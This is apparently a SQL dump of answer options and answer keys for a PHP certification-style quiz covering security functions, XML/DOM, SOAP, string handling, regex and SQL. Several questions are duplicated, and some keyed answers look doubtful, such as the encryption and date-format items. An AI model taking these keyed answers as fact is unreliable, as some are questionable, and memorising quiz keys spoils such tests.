	(758,141,'It escapes all special characters from strings $_POST[\"name\"] and $_POST[\"password\"] except \' and \".',0,'2012-11-23 22:51:40','2012-11-23 22:51:40'),
	(759,142,'Remove the .php suffix, allowing access to files other than .php.',1,'2012-11-23 22:53:41','2012-11-23 22:53:41'),
	(760,142,'Execute the malicious code that exists in the file vulnerable.php.',0,'2012-11-23 22:53:41','2012-11-23 22:53:41'),
	(761,142,'Perform a cross-site scripting attack.',0,'2012-11-23 22:53:41','2012-11-23 22:53:41'),
	(762,142,'Inject a remotely hosted file containing an exploit.',0,'2012-11-23 22:53:41','2012-11-23 22:53:41'),
	(763,143,'escapeshellarg()',1,'2012-11-23 22:55:28','2012-11-23 22:55:28'),
	(764,143,'escapeshellcmd()',1,'2012-11-23 22:55:28','2012-11-23 22:55:28'),
	(765,143,'mysql_real_escape_string()',0,'2012-11-23 22:55:28','2012-11-23 22:55:28'),
	(766,143,'regenerateid()',0,'2012-11-23 22:55:28','2012-11-23 22:55:28'),
	(767,144,'Email injection',1,'2012-11-23 22:56:12','2012-11-23 22:56:12'),
	(768,144,'SQL injection',0,'2012-11-23 22:56:12','2012-11-23 22:56:12'),
	(769,144,'Email Bomber',0,'2012-11-23 22:56:12','2012-11-23 22:56:12'),
	(770,144,'Email scheduler',0,'2012-11-23 22:56:12','2012-11-23 22:56:12'),
	(771,145,'filter_input()',1,'2012-11-23 22:57:31','2012-11-23 22:57:31'),
	(772,145,'filter()',0,'2012-11-23 22:57:31','2012-11-23 22:57:31'),
	(773,145,'filter_output()',0,'2012-11-23 22:57:31','2012-11-23 22:57:31'),
	(774,145,'filter_name()',0,'2012-11-23 22:57:31','2012-11-23 22:57:31'),
	(775,146,'Escape output procedure',1,'2012-11-23 22:58:52','2012-11-23 22:58:52'),
	(776,146,'Escape input procedure',0,'2012-11-23 22:58:52','2012-11-23 22:58:52'),
	(777,146,'Formatted output',0,'2012-11-23 22:58:52','2012-11-23 22:58:52'),
	(778,146,'Formatted input',0,'2012-11-23 22:58:52','2012-11-23 22:58:52'),
	(779,147,'User can upload big file and fill the storage device.',1,'2012-11-23 22:59:38','2012-11-23 22:59:38'),
	(780,147,'User can upload virus which can spread itself.',1,'2012-11-23 22:59:38','2012-11-23 22:59:38'),
	(781,147,'User can see other users\' uploaded data.',1,'2012-11-23 22:59:38','2012-11-23 22:59:38'),
	(782,147,'User can upload malicious PHP adware and malware that can control on database and server.',0,'2012-11-23 22:59:38','2012-11-23 22:59:38'),
	(783,148,'DES',1,'2012-11-23 23:00:51','2012-11-23 23:00:51'),
	(784,148,'TripleDES',1,'2012-11-23 23:00:51','2012-11-23 23:00:51'),
	(785,148,'Blowfish',1,'2012-11-23 23:00:51','2012-11-23 23:00:51'),
	(786,148,'AES',0,'2012-11-23 23:00:51','2012-11-23 23:00:51'),
	(787,149,'apc.enabled',1,'2012-11-23 23:01:37','2012-11-23 23:01:37'),
	(788,149,'auto_append_file',0,'2012-11-23 23:01:37','2012-11-23 23:01:37'),
	(789,149,'cgi.force_redirect',0,'2012-11-23 23:01:37','2012-11-23 23:01:37'),
	(790,149,'child_terminate',0,'2012-11-23 23:01:37','2012-11-23 23:01:37'),
	(791,150,'use_soap_error_handler',1,'2012-11-23 23:03:54','2012-11-23 23:03:54'),
	(792,150,'is_soap_fault',0,'2012-11-23 23:03:54','2012-11-23 23:03:54'),
	(793,150,'error_handler',0,'2012-11-23 23:03:54','2012-11-23 23:03:54'),
	(794,150,'soap error_handler',0,'2012-11-23 23:03:54','2012-11-23 23:03:54'),
	(795,151,'strtr',1,'2012-11-23 23:04:56','2012-11-23 23:04:56'),
	(796,151,'substr_compare',0,'2012-11-23 23:04:56','2012-11-23 23:04:56'),
	(797,151,'substr_count',0,'2012-11-23 23:04:56','2012-11-23 23:04:56'),
	(798,151,'substr_replace',0,'2012-11-23 23:04:56','2012-11-23 23:04:56'),
	(799,152,'wordwrap',1,'2012-11-23 23:05:47','2012-11-23 23:05:47'),
	(800,152,'ucwords',0,'2012-11-23 23:05:47','2012-11-23 23:05:47'),
	(801,152,'ucfirst',0,'2012-11-23 23:05:47','2012-11-23 23:05:47'),
	(802,152,'trim',0,'2012-11-23 23:05:47','2012-11-23 23:05:47'),
	(803,153,'strrev',1,'2012-11-23 23:07:05','2012-11-23 23:07:05'),
	(804,153,'strpos',0,'2012-11-23 23:07:05','2012-11-23 23:07:05'),
	(805,153,'stripos',0,'2012-11-23 23:07:05','2012-11-23 23:07:05'),
	(806,153,'strrchr',0,'2012-11-23 23:07:05','2012-11-23 23:07:05'),
	(807,154,'$sxml->body->h1->a[\'href\']',1,'2012-11-24 12:18:12','2012-11-24 12:18:12'),
	(808,154,'$sxml->body->h1->a->href',0,'2012-11-24 12:18:12','2012-11-24 12:18:12'),
	(809,154,'$sxml->h1->a->href',0,'2012-11-24 12:18:12','2012-11-24 12:18:12'),
	(810,154,'$sxml->body->h1->a<href>',0,'2012-11-24 12:18:12','2012-11-24 12:18:12'),
	(811,155,'The contents of every tasks and details nodes',1,'2012-11-24 12:20:01','2012-11-24 12:20:01'),
	(812,155,'The XML of every tasks and details nodes',0,'2012-11-24 12:20:01','2012-11-24 12:20:01'),
	(813,155,'The contents of the whole XML document',0,'2012-11-24 12:20:01','2012-11-24 12:20:01'),
	(814,155,'The XML of whole XML document',0,'2012-11-24 12:20:01','2012-11-24 12:20:01'),
	(815,156,'It will display the contents of the XML file.',0,'2012-11-24 12:21:23','2012-11-24 12:21:23'),
	(816,156,'It will display the XML code of the XML file.',0,'2012-11-24 12:21:23','2012-11-24 12:21:23'),
	(817,156,'It will display the root element of the XML file.',1,'2012-11-24 12:21:23','2012-11-24 12:21:23'),
	(818,156,'It will throw an error.',0,'2012-11-24 12:21:23','2012-11-24 12:21:23'),
	(819,157,'create index foox on foo (c1,c2,c3)',0,'2012-11-24 12:22:54','2012-11-24 12:22:54'),
	(820,157,'create index foox on foo (c2,c1,c3)',0,'2012-11-24 12:22:54','2012-11-24 12:22:54'),
	(821,157,'create index foox on foo (c3,c1,c2)',0,'2012-11-24 12:22:54','2012-11-24 12:22:54'),
	(822,157,'create index foox on foo (c3,c2,c1)',1,'2012-11-24 12:22:54','2012-11-24 12:22:54'),
	(823,158,'$dom->document_element();',1,'2012-11-24 12:24:43','2012-11-24 12:24:43'),
	(824,158,'$dom->root_element();',0,'2012-11-24 12:24:43','2012-11-24 12:24:43'),
	(825,158,'$node->parent_node();',0,'2012-11-24 12:24:43','2012-11-24 12:24:43'),
	(826,158,'$dom->root_node();',0,'2012-11-24 12:24:43','2012-11-24 12:24:43'),
	(827,159,'dom_simplexml()',0,'2012-11-24 12:27:36','2012-11-24 12:27:36'),
	(828,159,'simplexml_import()',0,'2012-11-24 12:27:36','2012-11-24 12:27:36'),
	(829,159,'dom_import_simplexml()',1,'2012-11-24 12:27:36','2012-11-24 12:27:36'),
	(830,159,'dom_simplexml_import()',0,'2012-11-24 12:27:36','2012-11-24 12:27:36'),
	(831,160,'DomNode::appendChild()',1,'2012-11-24 12:29:18','2012-11-24 12:29:18'),
	(832,160,'DomNode::insertBefore()',1,'2012-11-24 12:29:18','2012-11-24 12:29:18'),
	(833,160,'DomNode::cloneNode()',0,'2012-11-24 12:29:18','2012-11-24 12:29:18'),
	(834,160,'DomElement::setAttribute()',0,'2012-11-24 12:29:18','2012-11-24 12:29:18'),
	(835,161,'DomDocument::createElement()',1,'2012-11-24 12:30:29','2012-11-24 12:30:29'),
	(836,161,'DomDocument::createElementNS()',1,'2012-11-24 12:30:29','2012-11-24 12:30:29'),
	(837,161,'DomDocument::createTextNode()',1,'2012-11-24 12:30:29','2012-11-24 12:30:29'),
	(838,161,'DomNode::cloneNode()',0,'2012-11-24 12:30:29','2012-11-24 12:30:29'),
	(839,162,'echo $child->getName() . \": \" . $child . \"<br />\";',1,'2012-11-24 12:34:07','2012-11-24 12:34:07'),
	(840,162,'echo $child->getNamespaces() . \": \" . $child . \"<br />\";',0,'2012-11-24 12:34:07','2012-11-24 12:34:07'),
	(841,162,'echo $child->getDocNamespaces() . \": \" . $child . \"<br />\";',0,'2012-11-24 12:34:07','2012-11-24 12:34:07'),
	(842,162,'echo $child->asXML() . \": \" . $child . \"<br />\";',0,'2012-11-24 12:34:07','2012-11-24 12:34:07'),
	(843,163,'children()',1,'2012-11-24 12:36:00','2012-11-24 12:36:00'),
	(844,163,'asXML()',0,'2012-11-24 12:36:00','2012-11-24 12:36:00'),
	(845,163,'getName()',0,'2012-11-24 12:36:00','2012-11-24 12:36:00'),
	(846,163,'attributes()',0,'2012-11-24 12:36:00','2012-11-24 12:36:00'),
	(847,164,'xml_set_element_handler()',1,'2012-11-24 12:38:49','2012-11-24 12:38:49'),
	(848,164,'xml_set_object()',0,'2012-11-24 12:38:49','2012-11-24 12:38:49'),
	(849,164,'xml_parse_into_struct()',0,'2012-11-24 12:38:49','2012-11-24 12:38:49'),
	(850,164,'xml_parser_create_ns()',0,'2012-11-24 12:38:49','2012-11-24 12:38:49'),
	(851,165,'&',0,'2012-11-24 12:40:17','2012-11-24 12:40:17'),
	(852,165,'<',0,'2012-11-24 12:40:17','2012-11-24 12:40:17'),
	(853,165,'>',0,'2012-11-24 12:40:17','2012-11-24 12:40:17'),
	(854,165,';',1,'2012-11-24 12:40:17','2012-11-24 12:40:17'),
	(855,166,'xml_set_element_handler()',1,'2012-11-24 12:41:23','2012-11-24 12:41:23'),
	(856,166,'xml_parser_create()',0,'2012-11-24 12:41:23','2012-11-24 12:41:23'),
	(857,166,'xml_get_current_column_number',0,'2012-11-24 12:41:23','2012-11-24 12:41:23'),
	(858,166,'xml_get_current_line_number',0,'2012-11-24 12:41:23','2012-11-24 12:41:23'),
	(859,167,'xml_set_object()',1,'2012-11-24 12:42:30','2012-11-24 12:42:30'),
	(860,167,'xml_parse_into_struct()',0,'2012-11-24 12:42:30','2012-11-24 12:42:30'),
	(861,167,'xml_parser_set_option()',0,'2012-11-24 12:42:30','2012-11-24 12:42:30'),
	(862,167,'xml_set_character_data_handler()',0,'2012-11-24 12:42:30','2012-11-24 12:42:30'),
	(863,168,'xml_parse_into_struct()',1,'2012-11-24 12:43:41','2012-11-24 12:43:41'),
	(864,168,'xml_set_external_entity_ref_handler()',0,'2012-11-24 12:43:41','2012-11-24 12:43:41'),
	(865,168,'xml_set_object()',0,'2012-11-24 12:43:41','2012-11-24 12:43:41'),
	(866,168,'xml_set_processing_instruction_handler()',0,'2012-11-24 12:43:41','2012-11-24 12:43:41'),
	(867,169,'xml_parser_create_ns()',1,'2012-11-24 12:45:23','2012-11-24 12:45:23'),
	(868,169,'xml_get_current_byte_index()',0,'2012-11-24 12:45:23','2012-11-24 12:45:23'),
	(869,169,'xml_get_current_column_number()',0,'2012-11-24 12:45:23','2012-11-24 12:45:23'),
	(870,169,'xml_get_current_line_number()',0,'2012-11-24 12:45:23','2012-11-24 12:45:23'),
	(871,170,'asXML()',1,'2012-11-24 12:46:43','2012-11-24 12:46:43'),
	(872,170,'xml_error_string()',0,'2012-11-24 12:46:43','2012-11-24 12:46:43'),
	(873,170,'xml_get_current_byte_index()',0,'2012-11-24 12:46:43','2012-11-24 12:46:43'),
	(874,170,'xml_get_current_column_number()',0,'2012-11-24 12:46:43','2012-11-24 12:46:43'),
	(875,171,'dom->document_element()',1,'2012-11-24 12:48:15','2012-11-24 12:48:15'),
	(876,171,'XMLReader::close()',0,'2012-11-24 12:48:15','2012-11-24 12:48:15'),
	(877,171,'XMLReader::expand()',0,'2012-11-24 12:48:15','2012-11-24 12:48:15'),
	(878,171,'XMLReader::getAttribute()',0,'2012-11-24 12:48:15','2012-11-24 12:48:15'),
	(879,172,'children()',1,'2012-11-24 12:49:22','2012-11-24 12:49:22'),
	(880,172,'getName()',0,'2012-11-24 12:49:22','2012-11-24 12:49:22'),
	(881,172,'getNamespaces()',0,'2012-11-24 12:49:22','2012-11-24 12:49:22'),
	(882,172,'getDocNamespaces()',0,'2012-11-24 12:49:22','2012-11-24 12:49:22'),
	(883,173,'getName()',1,'2012-11-24 12:50:16','2012-11-24 12:50:16'),
	(884,173,'getNamespaces()',0,'2012-11-24 12:50:16','2012-11-24 12:50:16'),
	(885,173,'getDefined()',0,'2012-11-24 12:50:16','2012-11-24 12:50:16'),
	(886,173,'getCall()',0,'2012-11-24 12:50:16','2012-11-24 12:50:16'),
	(887,174,'getNamespaces()',1,'2012-11-24 12:51:37','2012-11-24 12:51:37'),
	(888,174,'getName()',0,'2012-11-24 12:51:37','2012-11-24 12:51:37'),
	(889,174,'getDefined()',0,'2012-11-24 12:51:37','2012-11-24 12:51:37'),
	(890,174,'getElement()',0,'2012-11-24 12:51:37','2012-11-24 12:51:37'),
	(891,175,'getDocNamespaces()',1,'2012-11-24 12:52:42','2012-11-24 12:52:42'),
	(892,175,'getNamespaces()',0,'2012-11-24 12:52:42','2012-11-24 12:52:42'),
	(893,175,'getName()',0,'2012-11-24 12:52:42','2012-11-24 12:52:42'),
	(894,175,'children()',0,'2012-11-24 12:52:42','2012-11-24 12:52:42'),
	(895,176,'The contents of every tasks and details nodes',1,'2012-11-24 12:55:03','2012-11-24 12:55:03'),
	(896,176,'The XML of every tasks and details nodes',0,'2012-11-24 12:55:03','2012-11-24 12:55:03'),
	(897,176,'The contents of the whole XML document',0,'2012-11-24 12:55:03','2012-11-24 12:55:03'),
	(898,176,'The XML of whole XML document',0,'2012-11-24 12:55:03','2012-11-24 12:55:03'),
	(899,177,'It will display the contents of the XML file.',0,'2012-11-24 13:14:31','2012-11-24 13:14:31'),
	(900,177,'It will display the XML code of the XML file.',0,'2012-11-24 13:14:31','2012-11-24 13:14:31'),
	(901,177,'It will display the root element of the XML file.',1,'2012-11-24 13:14:31','2012-11-24 13:14:31'),
	(902,177,'It will throw an error.',0,'2012-11-24 13:14:31','2012-11-24 13:14:31'),
	(903,178,'create index foox on foo (c1,c2,c3)',0,'2012-11-24 13:15:54','2012-11-24 13:15:54'),
	(904,178,'create index foox on foo (c2,c1,c3)',0,'2012-11-24 13:15:54','2012-11-24 13:15:54'),
	(905,178,'create index foox on foo (c3,c1,c2)',0,'2012-11-24 13:15:54','2012-11-24 13:15:54'),
	(906,178,'create index foox on foo (c3,c2,c1)',1,'2012-11-24 13:15:54','2012-11-24 13:15:54'),
	(907,179,'$dom->document_element();',1,'2012-11-24 13:17:23','2012-11-24 13:17:23'),
	(908,179,'$dom->root_element();',0,'2012-11-24 13:17:23','2012-11-24 13:17:23'),
	(909,179,'$node->parent_node();',0,'2012-11-24 13:17:23','2012-11-24 13:17:23'),
	(910,179,'$dom->root_node();',0,'2012-11-24 13:17:23','2012-11-24 13:17:23'),
	(911,180,'It provides CURL support.',0,'2012-11-24 13:18:35','2012-11-24 13:18:35'),
	(912,180,'It provides OOPS support.',0,'2012-11-24 13:18:35','2012-11-24 13:18:35'),
	(913,180,'It provides potential SOAP extension.',0,'2012-11-24 13:18:35','2012-11-24 13:18:35'),
	(914,180,'It provides MXML support.',1,'2012-11-24 13:18:35','2012-11-24 13:18:35'),
	(915,181,'It does not XML support.',0,'2012-11-24 13:19:35','2012-11-24 13:19:35'),
	(916,181,'It provides CURL support.',1,'2012-11-24 13:19:35','2012-11-24 13:19:35'),
	(917,181,'It provides OOPS support.',1,'2012-11-24 13:19:35','2012-11-24 13:19:35'),
	(918,181,'It provides potential SOAP extension.',1,'2012-11-24 13:19:35','2012-11-24 13:19:35'),
	(919,182,'HTTP',1,'2012-11-24 13:21:10','2012-11-24 13:21:10'),
	(920,182,'FTP',0,'2012-11-24 13:21:10','2012-11-24 13:21:10'),
	(921,182,'SFTP',0,'2012-11-24 13:21:10','2012-11-24 13:21:10'),
	(922,182,'FTPS',0,'2012-11-24 13:21:10','2012-11-24 13:21:10'),
	(923,183,'SOAP',1,'2012-11-24 13:24:08','2012-11-24 13:24:08'),
	(924,183,'REST',0,'2012-11-24 13:24:08','2012-11-24 13:24:08'),
	(925,183,'HTTP',0,'2012-11-24 13:24:08','2012-11-24 13:24:08'),
	(926,183,'POP3',0,'2012-11-24 13:24:08','2012-11-24 13:24:08'),
	(927,184,'__getLastRequestHeaders()',1,'2012-11-24 13:25:06','2012-11-24 13:25:06'),
	(928,184,'__getLastRequest()',1,'2012-11-24 13:25:06','2012-11-24 13:25:06'),
	(929,184,'__debugMethods()',0,'2012-11-24 13:25:06','2012-11-24 13:25:06'),
	(930,184,'__debugRequest()',0,'2012-11-24 13:25:06','2012-11-24 13:25:06'),
	(931,185,'is_soap_fault($result)',1,'2012-11-24 13:29:40','2012-11-24 13:29:40'),
	(932,185,'use_soap_error_handler($result)',0,'2012-11-24 13:29:40','2012-11-24 13:29:40'),
	(933,185,'is_soap_error_handler($result)',0,'2012-11-24 13:29:40','2012-11-24 13:29:40'),
	(934,185,'use_soap_fault_handler($result)',0,'2012-11-24 13:29:40','2012-11-24 13:29:40'),
	(935,186,'$client = new SoapClient(\"any.wsdl\");',1,'2012-11-24 13:30:47','2012-11-24 13:30:47'),
	(936,186,'$client = new SoapClient;',0,'2012-11-24 13:30:47','2012-11-24 13:30:47'),
	(937,186,'$client => SoapClient = \"any.wsdl\";',0,'2012-11-24 13:30:47','2012-11-24 13:30:47'),
	(938,186,'$client = new SoapClient(null, array());',0,'2012-11-24 13:30:47','2012-11-24 13:30:47'),
	(939,187,'WSDL',1,'2012-11-24 13:33:55','2012-11-24 13:33:55'),
	(940,187,'SOAP',0,'2012-11-24 13:33:55','2012-11-24 13:33:55'),
	(941,187,'HTTP',0,'2012-11-24 13:33:55','2012-11-24 13:33:55'),
	(942,187,'UDDI',0,'2012-11-24 13:33:55','2012-11-24 13:33:55'),
	(943,188,'SOAP',1,'2012-11-24 13:34:46','2012-11-24 13:34:46'),
	(944,188,'XSL',0,'2012-11-24 13:34:46','2012-11-24 13:34:46'),
	(945,188,'XML',0,'2012-11-24 13:34:46','2012-11-24 13:34:46'),
	(946,188,'CURL',0,'2012-11-24 13:34:46','2012-11-24 13:34:46'),
	(947,189,'print date(\'G:i a\');',0,'2012-11-24 13:37:00','2012-11-24 13:37:00'),
	(948,189,'print strftime(\'%I:%M %p\');',1,'2012-11-24 13:37:00','2012-11-24 13:37:00'),
	(949,189,'print date(\'H:i a\');',1,'2012-11-24 13:37:00','2012-11-24 13:37:00'),
	(950,189,'print date(\'Y:i a\');',0,'2012-11-24 13:37:00','2012-11-24 13:37:00'),
	(951,190,'1435',0,'2012-11-24 13:38:49','2012-11-24 13:38:49'),
	(952,190,'0',0,'2012-11-24 13:38:49','2012-11-24 13:38:49'),
	(953,190,'True',0,'2012-11-24 13:38:49','2012-11-24 13:38:49'),
	(954,190,'False',1,'2012-11-24 13:38:49','2012-11-24 13:38:49'),
	(955,191,'Script will return an error message.',0,'2012-11-24 13:40:00','2012-11-24 13:40:00'),
	(956,191,'False',0,'2012-11-24 13:40:00','2012-11-24 13:40:00'),
	(957,191,'True',0,'2012-11-24 13:40:00','2012-11-24 13:40:00'),
	(958,191,'It will return any integer value other than 0, 1.',1,'2012-11-24 13:40:00','2012-11-24 13:40:00'),
	(959,192,'abc',0,'2012-11-24 13:47:17','2012-11-24 13:47:17'),
	(960,192,'cdabc',0,'2012-11-24 13:47:17','2012-11-24 13:47:17'),
	(961,192,'abcdabc',1,'2012-11-24 13:47:17','2012-11-24 13:47:17'),
	(962,192,'cdabcab',0,'2012-11-24 13:47:17','2012-11-24 13:47:17'),
	(963,193,'<?php $string1= \"ZeNd php\"; $string1= strtolower($string1); echo strrev($string1); ?>',1,'2012-11-24 13:48:44','2012-11-24 13:48:44'),
	(964,193,'<?php $string1= \"ZeNd php\"; $string1= strtolower($string1); echo stringrev($string1); ?>',0,'2012-11-24 13:48:44','2012-11-24 13:48:44'),
	(965,193,'<?php $string1= \"ZeNd php\"; $string1= trim($string1); echo stringrev($string1); ?>',0,'2012-11-24 13:48:44','2012-11-24 13:48:44'),
	(966,193,'<?php $string1= \"ZeNd php\"; $string1= str_to_lower($string1); echo strev($string1); ?>',0,'2012-11-24 13:48:44','2012-11-24 13:48:44'),
	(967,194,'0',0,'2012-11-24 13:50:22','2012-11-24 13:50:22'),
	(968,194,'hello1234',0,'2012-11-24 13:50:22','2012-11-24 13:50:22'),
	(969,194,'hello334',0,'2012-11-24 13:50:22','2012-11-24 13:50:22'),
	(970,194,'234',1,'2012-11-24 13:50:22','2012-11-24 13:50:22'),
	(971,195,'strcasecmp()',1,'2012-11-24 13:51:16','2012-11-24 13:51:16'),
	(972,195,'strcmp()',0,'2012-11-24 13:51:16','2012-11-24 13:51:16'),
	(973,195,'strstr()',0,'2012-11-24 13:51:16','2012-11-24 13:51:16'),
	(974,195,'substr()',0,'2012-11-24 13:51:16','2012-11-24 13:51:16'),
	(975,196,'13179',1,'2012-11-24 13:52:30','2012-11-24 13:52:30'),
	(976,196,'0',0,'2012-11-24 13:52:30','2012-11-24 13:52:30'),
	(977,196,'The script will throw an error message.',0,'2012-11-24 13:52:30','2012-11-24 13:52:30'),
	(978,196,'13149',0,'2012-11-24 13:52:30','2012-11-24 13:52:30'),
	(979,197,'preg_split()',1,'2012-11-24 13:53:48','2012-11-24 13:53:48'),
	(980,197,'explode()',1,'2012-11-24 13:53:48','2012-11-24 13:53:48'),
	(981,197,'implode()',0,'2012-11-24 13:53:48','2012-11-24 13:53:48'),
	(982,197,'strstr()',0,'2012-11-24 13:53:48','2012-11-24 13:53:48'),
	(983,198,'substr(\"john@php.com\", strpos(\"john@php.com\", \".\")+1);',1,'2012-11-24 13:57:31','2012-11-24 13:57:31'),
	(984,198,'eregi(\"^[a-z0-9\\._-]+\".\"@\".\"([a-z0-9][a-z0-9-]*[a-z0-9]\\.)+\".\"([a-z]+\\.)?\".\"([a-z]+)$\", john@php.com))',0,'2012-11-24 13:57:31','2012-11-24 13:57:31'),
	(985,198,'substr(\"john@php.com\", strpos(\"john@php.com\", \".\"));',0,'2012-11-24 13:57:31','2012-11-24 13:57:31'),
	(986,198,'eregi(\"john@php.com\", \".\");',0,'2012-11-24 13:57:31','2012-11-24 13:57:31'),
	(987,199,'implode()',1,'2012-11-24 13:59:05','2012-11-24 13:59:05'),
	(988,199,'explode()',0,'2012-11-24 13:59:05','2012-11-24 13:59:05'),
	(989,199,'ltrim()',0,'2012-11-24 13:59:05','2012-11-24 13:59:05'),
	(990,199,'substr()',0,'2012-11-24 13:59:05','2012-11-24 13:59:05'),
	(991,200,'echo strtr (\'acb\', $charlist);',1,'2012-11-24 14:01:13','2012-11-24 14:01:13'),
	(992,200,'echo strstr (\'acb\', $charlist);',0,'2012-11-24 14:01:13','2012-11-24 14:01:13'),
	(993,200,'echo strtok (\'acb\', $charlist);',0,'2012-11-24 14:01:13','2012-11-24 14:01:13'),
	(994,200,'echo strip_tags(\'acb\', $charlist);',0,'2012-11-24 14:01:13','2012-11-24 14:01:13'),
	(999,201,'jennyjohn',1,'2012-11-24 14:04:02','2012-11-24 14:04:02'),
	(1000,201,'jenny',0,'2012-11-24 14:04:02','2012-11-24 14:04:02'),
	(1001,201,'jenn',0,'2012-11-24 14:04:02','2012-11-24 14:04:02'),
	(1002,201,'john',0,'2012-11-24 14:04:02','2012-11-24 14:04:02'),
	(1003,201,'The script will throw an error message.',0,'2012-11-24 14:04:02','2012-11-24 14:04:02'),
	(1004,202,'6',1,'2012-11-24 14:05:32','2012-11-24 14:05:32'),
	(1005,202,'12345',0,'2012-11-24 14:05:32','2012-11-24 14:05:32'),
	(1006,202,'123445',0,'2012-11-24 14:05:32','2012-11-24 14:05:32'),
	(1007,202,'abcdef',0,'2012-11-24 14:05:32','2012-11-24 14:05:32'),
	(1008,203,'Array ( [0] => one [1] => two [2] => three )',1,'2012-11-24 14:06:53','2012-11-24 14:06:53'),
	(1009,203,'Array ( [0] => one [1] => two [2] => three [3] => four )',0,'2012-11-24 14:06:53','2012-11-24 14:06:53'),
	(1010,203,'Array ( [0] => two [1] => three [2] => four )',0,'2012-11-24 14:06:53','2012-11-24 14:06:53'),
	(1011,203,'Array ( [0] => one [1] => two [2] => four )',0,'2012-11-24 14:06:53','2012-11-24 14:06:53'),
	(1012,204,'strtok()',1,'2012-11-24 14:09:09','2012-11-24 14:09:09'),
	(1013,204,'substr()',0,'2012-11-24 14:09:09','2012-11-24 14:09:09'),
	(1014,204,'strtr()',0,'2012-11-24 14:09:09','2012-11-24 14:09:09'),
	(1015,204,'strrev()',0,'2012-11-24 14:09:09','2012-11-24 14:09:09'),
	(1016,205,'.',0,'2012-11-24 14:10:36','2012-11-24 14:10:36'),
	(1017,205,'\\d',0,'2012-11-24 14:10:36','2012-11-24 14:10:36'),
	(1018,205,'\\w',0,'2012-11-24 14:10:36','2012-11-24 14:10:36'),
	(1019,205,'\\W',1,'2012-11-24 14:10:36','2012-11-24 14:10:36'),
	(1020,206,'[[:digit:^]]',0,'2012-11-24 14:12:53','2012-11-24 14:12:53'),
	(1021,206,'[^[:digit:]]',1,'2012-11-24 14:12:53','2012-11-24 14:12:53'),
	(1022,206,'^[[:digit]]',0,'2012-11-24 14:12:53','2012-11-24 14:12:53'),
	(1023,206,'[[:digit:]^]',0,'2012-11-24 14:12:53','2012-11-24 14:12:53'),
	(1024,207,' preg_split()',0,'2012-11-24 14:15:18','2012-11-24 14:15:18'),
	(1025,207,'preg_match()',0,'2012-11-24 14:15:18','2012-11-24 14:15:18'),
	(1026,207,'preg_quote()',1,'2012-11-24 14:15:18','2012-11-24 14:15:18'),
	(1027,207,'explode()',0,'2012-11-24 14:15:18','2012-11-24 14:15:18'),
	(1028,208,'Array ( [0] => AB )',1,'2012-11-24 14:16:53','2012-11-24 14:16:53'),
	(1029,208,'Array ( [0] => asdfg589nm )',0,'2012-11-24 14:16:53','2012-11-24 14:16:53'),
	(1030,208,'Array ( [0] => AB GH )',0,'2012-11-24 14:16:53','2012-11-24 14:16:53'),
	(1031,208,'Array ( [0] => 589 )',0,'2012-11-24 14:16:53','2012-11-24 14:16:53'),
	(1032,209,'.',0,'2012-11-24 14:18:30','2012-11-24 14:18:30'),
	(1033,209,'^',0,'2012-11-24 14:18:30','2012-11-24 14:18:30'),
	(1034,209,'$',0,'2012-11-24 14:18:30','2012-11-24 14:18:30'),
	(1035,209,'\\s',1,'2012-11-24 14:18:30','2012-11-24 14:18:30'),
	(1036,210,'\"Hello World\"',1,'2012-11-24 14:21:11','2012-11-24 14:21:11'),
	(1037,210,'<<< TEXT \"Hello $who\"',0,'2012-11-24 14:21:11','2012-11-24 14:21:11'),
	(1038,210,'TEXT \"Hello $who\"',0,'2012-11-24 14:21:11','2012-11-24 14:21:11'),
	(1039,210,'TEXT \"Hello World\"',0,'2012-11-24 14:21:11','2012-11-24 14:21:11'),
	(1040,211,'HIWORLD',1,'2012-11-24 14:22:44','2012-11-24 14:22:44'),
	(1041,211,'The script will throw an error.',0,'2012-11-24 14:22:44','2012-11-24 14:22:44'),
	(1042,211,'HI,WORLD',0,'2012-11-24 14:22:44','2012-11-24 14:22:44'),
	(1043,211,'hiworld',0,'2012-11-24 14:22:44','2012-11-24 14:22:44'),
	(1044,212,'hello',0,'2012-11-24 14:24:10','2012-11-24 14:24:10'),
	(1045,212,'world',1,'2012-11-24 14:24:10','2012-11-24 14:24:10'),
	(1046,212,'helloworld',0,'2012-11-24 14:24:10','2012-11-24 14:24:10'),
	(1047,212,'an empty string',0,'2012-11-24 14:24:10','2012-11-24 14:24:10'),
	(1048,213,'preg_quote',1,'2012-11-24 14:25:07','2012-11-24 14:25:07'),
	(1049,213,'quotemeta',1,'2012-11-24 14:25:07','2012-11-24 14:25:07'),
	(1050,213,'strip_tags',0,'2012-11-24 14:25:07','2012-11-24 14:25:07'),
	(1051,213,'strtr',0,'2012-11-24 14:25:07','2012-11-24 14:25:07'),
	(1052,214,'Code will throw a warning message.',0,'2012-11-24 14:47:40','2012-11-24 14:47:40'),
	(1053,214,'Code will throw an error message.',0,'2012-11-24 14:47:40','2012-11-24 14:47:40'),
	(1054,214,'Code will run successfully.',1,'2012-11-24 14:47:40','2012-11-24 14:47:40'),
	(1055,214,'Code will not display anything; it will not give any error also.',0,'2012-11-24 14:47:40','2012-11-24 14:47:40'),
	(1056,215,'16',1,'2012-11-24 14:48:48','2012-11-24 14:48:48'),
	(1057,215,'32',0,'2012-11-24 14:48:48','2012-11-24 14:48:48'),
	(1058,215,'64',0,'2012-11-24 14:48:48','2012-11-24 14:48:48'),
	(1059,215,'8',0,'2012-11-24 14:48:48','2012-11-24 14:48:48'),
	(1060,216,'SELECT INTO',1,'2012-11-24 14:59:34','2012-11-24 14:59:34'),
	(1061,216,'INSERT INTO',0,'2012-11-24 14:59:34','2012-11-24 14:59:34'),
	(1062,216,'ADD INTO',0,'2012-11-24 14:59:34','2012-11-24 14:59:34'),
	(1063,216,'IMPORT INTO',0,'2012-11-24 14:59:34','2012-11-24 14:59:34'),
	(1064,217,'DROP TABLE <table_name> FROM DATABASE',0,'2012-11-24 15:01:27','2012-11-24 15:01:27'),
	(1065,217,'DELETE TABLE <table_name> FROM DATABASE',0,'2012-11-24 15:01:27','2012-11-24 15:01:27'),
	(1066,217,'DELETE TABLE <table_name>',0,'2012-11-24 15:01:27','2012-11-24 15:01:27'),
	(1067,217,'DROP TABLE <table_name>',1,'2012-11-24 15:01:27','2012-11-24 15:01:27'),
	(1068,218,'BETWEEN 25 & 40',0,'2012-11-24 15:02:28','2012-11-24 15:02:28'),
	(1069,218,'BETWEEN 25 - 40',0,'2012-11-24 15:02:28','2012-11-24 15:02:28'),
	(1070,218,'BETWEEN 25 TO 40',0,'2012-11-24 15:02:28','2012-11-24 15:02:28'),
	(1071,218,'BETWEEN 25 AND 40',1,'2012-11-24 15:02:28','2012-11-24 15:02:28'),
